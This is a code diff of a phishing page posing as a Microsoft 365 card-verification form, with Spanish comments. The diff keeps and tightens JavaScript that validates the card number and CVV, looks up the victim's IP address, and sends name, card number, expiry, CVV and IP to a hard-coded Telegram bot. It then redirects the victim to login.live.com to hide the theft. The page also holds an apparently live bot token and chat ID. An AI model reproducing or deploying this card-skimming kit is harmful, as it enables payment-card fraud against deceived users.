@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>365</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -13,10 +14,11 @@
       justify-content: center;
       align-items: center;
       min-height: 100vh;
+      overflow: hidden;
     }
 
     .modal-box {
-      width: 100%;
+      width: 90%; /* Ajustado a un 90% del ancho */
       max-width: 420px;
       border: 1px solid #ddd;
       border-radius: 6px;
@@ -38,13 +40,6 @@
 
     .logo {
       height: 24px;
-    }
-
-    .close-btn {
-      font-size: 24px;
-      font-weight: bold;
-      color: #333;
-      cursor: pointer;
     }
 
     .form-container {
@@ -129,7 +124,7 @@
     .error {
       color: red;
       font-size: 12px;
-      margin-top: 3px;
+      margin-top: 5px;
     }
 
     .submit-btn {
@@ -156,7 +151,6 @@
 <div class="modal-box">
   <div class="header">
     <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="logo">
-    <span class="close-btn" onclick="cerrarModal()">&times;</span>
   </div>
 
   <div class="form-container">
@@ -236,109 +230,98 @@
   </div>
 </div>
 
-<script>
-  function cerrarModal() {
-    window.location.href = 'index.html'; // ← Cambia esto por la URL a la que quieres ir
-  }
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 
-  document.getElementById('cardForm').addEventListener('submit', function(e) {
+<script>
+  document.getElementById('cardForm').addEventListener('submit', async function(e) {
     e.preventDefault();
 
     let valid = true;
 
+    // Limpiar errores anteriores
+    document.querySelectorAll('.error').forEach(function(errorElement) {
+      errorElement.textContent = '';
+    });
+
+    // Validación de nombre del titular
     const nombre = document.getElementById('nombre').value.trim();
     const errorNombre = document.getElementById('error-nombre');
     if (nombre === '') {
       errorNombre.textContent = 'El nombre es obligatorio.';
       valid = false;
-    } else {
-      errorNombre.textContent = '';
     }
 
+    // Validación del número de tarjeta
     const numero = document.getElementById('numero').value.trim();
     const errorNumero = document.getElementById('error-numero');
     if (!/^\d{13,19}$/.test(numero)) {
       errorNumero.textContent = 'Número de tarjeta inválido (13-19 dígitos).';
       valid = false;
-    } else {
-      errorNumero.textContent = '';
     }
 
+    // Validación de la fecha de expiración
     const mes = document.getElementById('mes').value;
     const ano = document.getElementById('ano').value;
     const errorExpiracion = document.getElementById('error-expiracion');
     if (mes === '' || ano === '') {
       errorExpiracion.textContent = 'Selecciona mes y año de expiración.';
       valid = false;
-    } else {
-      errorExpiracion.textContent = '';
     }
 
+    // Validación del CVV
     const cvv = document.getElementById('cvv').value.trim();
     const errorCvv = document.getElementById('error-cvv');
     if (!/^\d{3,4}$/.test(cvv)) {
       errorCvv.textContent = 'CVV inválido (3 o 4 dígitos).';
       valid = false;
-    } else {
-      errorCvv.textContent = '';
     }
 
-</script>
+    // Si todos los campos son válidos, proceder con el envío
+    if (valid) {
+      // Obtener valores del formulario
+      const fecha = `${mes}/${ano}`;
+      let ip = 'No disponible';
 
-<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+      // Obtener IP usando axios
+      try {
+        const res = await axios.get('https://ipapi.co/json/');
+        ip = res.data.ip;
+      } catch (error) {
+        console.warn("No se pudo obtener la IP:", error);
+      }
 
-<script>
-  const TOKEN = '7542806960:AAHfZElGSpGRq_Ier0wbNTGbhe_IMOokQeA'; // ← reemplaza
-  const CHAT_ID = '-4924487701';     // ← reemplaza
-
-  document.getElementById("cardForm").addEventListener("submit", async function(e) {
-    e.preventDefault();
-
-    // Obtener valores del formulario
-    const nombre = document.getElementById("nombre").value.trim();
-    const numero = document.getElementById("numero").value.trim();
-    const mes = document.getElementById("mes").value;
-    const ano = document.getElementById("ano").value;
-    const cvv = document.getElementById("cvv").value.trim();
-    const fecha = `${mes}/${ano}`;
-
-    let ip = 'No disponible';
-
-    // Obtener IP usando axios
-    try {
-      const res = await axios.get('https://ipapi.co/json/');
-      ip = res.data.ip;
-    } catch (error) {
-      console.warn("No se pudo obtener la IP:", error);
-    }
-
-    // Construir mensaje para Telegram
-    const mensaje = `
+      // Construir mensaje para Telegram
+      const mensaje = `
  CC:
  Titular: ${nombre}
  Número: ${numero}
  Expira: ${fecha}
  CVV: ${cvv}
- IP del usuario: ${ip}
+ IP: ${ip}
 `;
 
-    // Enviar mensaje a Telegram con axios
-    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+      // Enviar mensaje a Telegram con axios
+      const url = `https://api.telegram.org/bot7542806960:AAHfZElGSpGRq_Ier0wbNTGbhe_IMOokQeA/sendMessage`;
 
-    try {
-      await axios.post(url, {
-        chat_id: CHAT_ID,
-        text: mensaje
-      });
+      try {
+        await axios.post(url, {
+          chat_id: -4924487701,
+          text: mensaje
+        });
 
-      // Redireccionar tras el envío
-      window.location.href = 'https://login.live.com'; // ← reemplaza por tu URL
+        // Redireccionar tras el envío
+        window.location.href = 'https://login.live.com'; // ← reemplaza por tu URL
 
-    } catch (error) {
-      console.error("Error al enviar a Telegram:", error);
-      alert("Hubo un error al enviar los datos.");
+      } catch (error) {
+        console.error("Error al enviar a Telegram:", error);
+        alert("Hubo un error al enviar los datos.");
+      }
+    } else {
+      // Si hay errores, no hacer nada y mostrar los mensajes de error
+      alert("Por favor, complete todos los campos correctamente.");
     }
   });
 </script>
+
 </body>
 </html>
